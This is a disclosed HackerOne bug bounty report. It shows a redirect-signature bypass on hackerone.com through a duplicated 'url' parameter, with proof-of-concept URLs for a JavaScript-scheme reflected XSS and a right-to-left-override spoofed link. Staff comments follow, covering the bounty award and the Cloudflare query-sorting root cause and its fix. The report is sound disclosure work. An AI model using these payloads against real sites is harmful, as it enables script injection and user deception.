{"id":293689,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTM2ODk=","url":"https://hackerone.com/reports/293689","title":"Query parameter reordering causes redirect page to render unsafe URL","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-11-29T11:11:24.220Z","submitted_at":"2017-11-29T11:11:24.220Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"kenziy","url":"/kenziy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-11-30T06:09:18.879Z","bug_reporter_agreed_on_going_public_at":"2017-11-30T06:09:18.755Z","team_member_agreed_on_going_public_at":"2017-11-29T23:57:43.801Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello hackerone team\n\nI want to report I bypass w/c lead to XSS (but limited only for IE) due to CSP block on chrome\n\nHere is the POC\n------------------\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026url=http%3A%2F%2Fbuglabs.me\u0026url=JAVASCRIPT:alert%09(document.domain)\n```\n\nHow I find this issue\n-----------------------\nFirst I notice that before you will redirect to other site hackerone will notify users that they are being redirected to other website\nHere is example\n------------------\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026url=http%3A%2F%2Fbuglabs.me\n```\nBut when you change the url it will not match to the signature (h1 alers) by you can bypass it by adding \u0026url\nso it would look like this\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026url=http%3A%2F%2Fbuglabs.me\u0026url=\n```\nNow I try doing this to trigger XSS\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026url=http%3A%2F%2Fbuglabs.me\u0026url=JAVASCRIPT:alert%09(document.domain)\n```\ndue to CSP protection I was not able to trigger XSS (My bypass skills on CSP is not good enought :-( )\nBut in IE it works :-)\n\nI beleive that this is an issue\n\nMinor RTLO that can treak users\n------------------------------------\nAnd another things is I try to do a RTLO on the URL (But because it has filter alert I dont know if this will trigger your interest)\n```\nhttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026url=http%3A%2F%2Fbuglabs.me\u0026url=http%3A%2F%2F%09%E2%80%AEmoc.enorekcah\n```\n\nTested\n-------\nIE11 - for XSS\nChrome, Mozilla - for RTLO\n\n\nAdvance Merry Christmas guys :-)\n\nCheers\nKenziy\n\n## Impact\n\nTrick user or trigger malicious script","vulnerability_information_html":"\u003cp\u003eHello hackerone team\u003c/p\u003e\n\n\u003cp\u003eI want to report I bypass w/c lead to XSS (but limited only for IE) due to CSP block on chrome\u003c/p\u003e\n\n\u003ch2 id=\"here-is-the-poc\"\u003eHere is the POC\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026amp;url=http%3A%2F%2Fbuglabs.me\u0026amp;url=JAVASCRIPT:alert%09(document.domain)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"how-i-find-this-issue\"\u003eHow I find this issue\u003c/h2\u003e\n\n\u003cp\u003eFirst I notice that before you will redirect to other site hackerone will notify users that they are being redirected to other website\u003c/p\u003e\n\n\u003ch2 id=\"here-is-example\"\u003eHere is example\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026amp;url=http%3A%2F%2Fbuglabs.me\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBut when you change the url it will not match to the signature (h1 alers) by you can bypass it by adding \u0026amp;url\u003cbr\u003e\nso it would look like this\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026amp;url=http%3A%2F%2Fbuglabs.me\u0026amp;url=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNow I try doing this to trigger XSS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026amp;url=http%3A%2F%2Fbuglabs.me\u0026amp;url=JAVASCRIPT:alert%09(document.domain)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003edue to CSP protection I was not able to trigger XSS (My bypass skills on CSP is not good enought :-( )\u003cbr\u003e\nBut in IE it works :-)\u003c/p\u003e\n\n\u003cp\u003eI beleive that this is an issue\u003c/p\u003e\n\n\u003ch2 id=\"minor-rtlo-that-can-treak-users\"\u003eMinor RTLO that can treak users\u003c/h2\u003e\n\n\u003cp\u003eAnd another things is I try to do a RTLO on the URL (But because it has filter alert I dont know if this will trigger your interest)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttps://hackerone.com/redirect?signature=c9304cadaeabca0bfb7b92503c0318da5c42a86b\u0026amp;url=http%3A%2F%2Fbuglabs.me\u0026amp;url=http%3A%2F%2F%09%E2%80%AEmoc.enorekcah\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"tested\"\u003eTested\u003c/h2\u003e\n\n\u003cp\u003eIE11 - for XSS\u003cbr\u003e\nChrome, Mozilla - for RTLO\u003c/p\u003e\n\n\u003cp\u003eAdvance Merry Christmas guys :-)\u003c/p\u003e\n\n\u003cp\u003eCheers\u003cbr\u003e\nKenziy\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eTrick user or trigger malicious script\u003c/p\u003e\n","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":243030,"file_name":"xss.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/243/030/5d8b4cc0864834cd468cb0c93bdaad533cbc0136/xss.png?response-content-disposition=attachment%3B%20filename%3D%22xss.png%22%3B%20filename%2A%3DUTF-8%27%27xss.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052618Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=7ac40a6ce39ded17e4025a994953475536a3019bec9eea8b44f74b3f8862f2ae","file_size":6923,"type":"image/png"},{"id":243031,"file_name":"RTLO.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/243/031/08876832644474bef2cbe976c75a08b021b0de92/RTLO.png?response-content-disposition=attachment%3B%20filename%3D%22RTLO.png%22%3B%20filename%2A%3DUTF-8%27%27RTLO.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052618Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=c8ed09449152a64faeaf3c722c3221095a5d7c38de626633ba1302e72be4a345","file_size":31296,"type":"image/png"}],"allow_singular_disclosure_at":"2017-12-29T23:57:44.007Z","allow_singular_disclosure_after":-94627714.91241582,"singular_disclosure_allowed":true,"vote_count":61,"voters":["flamezzz","jokebookservice1","jensec","jr0ch17","europa","secator","foobar7","hunter","michiel","shailesh4594","and 51 more..."],"severity":{"rating":"medium","score":4.8,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"none"}},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2188446,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello HackerOne Security Team\n\nReproducible: YES\nImpact: I believe this may harm users\nIn Scope: YES","markdown_message":"\u003cp\u003eHello HackerOne Security Team\u003c/p\u003e\n\n\u003cp\u003eReproducible: YES\u003cbr\u003e\nImpact: I believe this may harm users\u003cbr\u003e\nIn Scope: YES\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-29T11:12:53.138Z","updated_at":"2017-11-29T11:12:53.138Z","actor":{"username":"kenziy","cleared":true,"url":"/kenziy","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/P1WN19AW2EesQFLDQpD3Sp4o/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2189592,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @kenziy - Thank you for your report. We are currently looking into this report and we'll notify you once we have more information to share with you. Thanks! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/kenziy\"\u003e@kenziy\u003c/a\u003e - Thank you for your report. We are currently looking into this report and we\u0026#39;ll notify you once we have more information to share with you. Thanks! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-29T19:13:21.991Z","updated_at":"2017-11-29T19:13:21.991Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2189632,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hey @kenziy - We are working on a fix for this issue. In the meanwhile, we have decided to assign a $1,250 bounty for the XSS and RTLO issues with an additional $250 bonus for the well written and creative submission.\n\nHappy hacking! ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/kenziy\"\u003e@kenziy\u003c/a\u003e - We are working on a fix for this issue. In the meanwhile, we have decided to assign a $1,250 bounty for the XSS and RTLO issues with an additional $250 bonus for the well written and creative submission.\u003c/p\u003e\n\n\u003cp\u003eHappy hacking! \u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-29T19:29:22.311Z","updated_at":"2017-11-29T19:29:22.311Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"1250.0","bounty_currency":"usd","bonus_amount":"250.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"kenziy","url":"/kenziy"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2189643,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-11-29T19:31:10.605Z","updated_at":"2017-11-29T19:31:10.605Z","additional_data":{"old_severity":"Low","new_severity":"Medium (4.8)","old_severity_id":98116,"new_severity_id":98227},"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2190149,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @kenziy - thanks again for bringing this to our attention. We believe the vulnerability has been addressed. The root cause of the vulnerability was rather interesting. In production, we had \"Query String Sort\" enabled in the Cloudflare caching settings. This is why we couldn't reproduce the same behavior in our local development environments. When Cloudflare sorted the `url` parameters, it placed the last `url` parameter (with the XSS payload) first because `J` (capital) comes before the `h` in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. We were able to confirm a similar behavior with other endpoints on hackerone.com. We fixed the vulnerability by disabling the setting in Cloudflare. Thanks again for bringing this to our attention, good find!\n\n{F243193}\n\nJobert","markdown_message":"\u003cp\u003eHi \u003ca href=\"/kenziy\"\u003e@kenziy\u003c/a\u003e - thanks again for bringing this to our attention. We believe the vulnerability has been addressed. The root cause of the vulnerability was rather interesting. In production, we had \u0026quot;Query String Sort\u0026quot; enabled in the Cloudflare caching settings. This is why we couldn\u0026#39;t reproduce the same behavior in our local development environments. When Cloudflare sorted the \u003ccode\u003eurl\u003c/code\u003e parameters, it placed the last \u003ccode\u003eurl\u003c/code\u003e parameter (with the XSS payload) first because \u003ccode\u003eJ\u003c/code\u003e (capital) comes before the \u003ccode\u003eh\u003c/code\u003e in the ASCII table. We noticed that the application load balancer (ALB) on AWS received the attributes in ascending order. We were able to confirm a similar behavior with other endpoints on hackerone.com. We fixed the vulnerability by disabling the setting in Cloudflare. Thanks again for bringing this to our attention, good find!\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"Screen_Shot_2017-11-29_at_3.38.32_PM.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-11-29_at_3.38.32_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-11-29_at_3.38.32_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052619Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026amp;X-Amz-Signature=f8e7bbe94f40531de6b0f06e5f2e2b1f404b15b2dd271905e7097aa8f8432e39\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-11-29_at_3.38.32_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-11-29_at_3.38.32_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T052619Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026amp;X-Amz-Signature=f8e7bbe94f40531de6b0f06e5f2e2b1f404b15b2dd271905e7097aa8f8432e39\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eJobert\u003c/p\u003e\n","automated_response":false,"created_at":"2017-11-29T23:49:42.822Z","updated_at":"2017-11-29T23:49:42.822Z","actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"kenziy","url":"/kenziy"},"attachments":[{"id":243193,"filename":"Screen_Shot_2017-11-29_at_3.38.32_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/243/193/3b54edc8b66adaf68d1914a0c71201cfe282164b/Screen_Shot_2017-11-29_at_3.38.32_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2017-11-29_at_3.38.32_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2017-11-29_at_3.38.32_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWPEA4QHM%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T052619Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGXO5frUwVLGFxDWBVmHmNT%2B6JlROQ%2Fh2Ys%2Flt0prcUdAiEArvZZU6vxK8OPvx82Pcq8o33YhSQ8Sp596o4I%2B71KXboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFQ%2Btleyar2CCMIQ%2FiqRA0oRJaH4MzQaTEXIvcYpkTRptMnZ49JBLdqQm33GGvhffjnOoBNIPiTSi6pdezRRKGgr1r4B1IAGIEGp9Era8%2FVjLY%2F84nxA3XI4F09nEgobPjCz6yKQh3VdoZ1avIgB18X6MWbibE7XQhQRHNf12J4W05BmzThHdywp5K3hTdg4KpP7gfvCo%2F4Ktt%2BaXFH811I8QeWjv5pthBCzZLk1JVibgJtAmfExNo%2FtxD14kJX5VoKxRaaBIvOPag6Dr88HIlbNhmmeq6P6UFDhMg9j%2BZBNBeotHBDUM26EuglJC3Do5CNYJ80SHnZOD9OcD4YbxIEIacpSbw2zg1v%2F05gXvDdJmBfg2CZ6M3Oe9RFIGOz7K78vcnthqjsbMkTQtnYm3oSlLsPXOQzsk689VyQIvD%2FvISy3mc%2BR8fkse0nfZ6oo5yVZ1HDkUwyVBrEhVRwgA40ECaneL73yKaXHsGZZNplJZJjpVg7LmiK5cHcw%2BazOBUYiFhWrnigrx9zn8ACMeIxnoLYYF%2FbtR5yKptoMokcKMJrlqv8FOusBX%2FkI%2Bxq9aH44%2FxV%2FlmQ8l6YTA1mqoIeT5eUoTCncJ05WnGa6jf%2FtNIbVh9Bx6I91Z7cvfP3JjmvlVXGM09Nq4G51yOTYLbDJoC0v2WVQiP4QLA0yKhxXdlHnVerT6B%2BXgGwNCiB4w%2Ffx7IW3WkvZS7FvSLvhKxN%2B9Yzbcsj0UDJ9rocF7CIpeIiVb9ydgCK8v%2F9BCTjB%2F%2BHuRrXJoVvGbT4DVZuH1ZXzKIkP77S8Hw4QXRGhfqaoNmjdAKhfZNzKbjD5vOLqlD%2BBKIMWfferNFi8FhO7cNacpti15lmAJ1SKZ1SQQImXMFuysA%3D%3D\u0026X-Amz-Signature=f8e7bbe94f40531de6b0f06e5f2e2b1f404b15b2dd271905e7097aa8f8432e39"}],"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"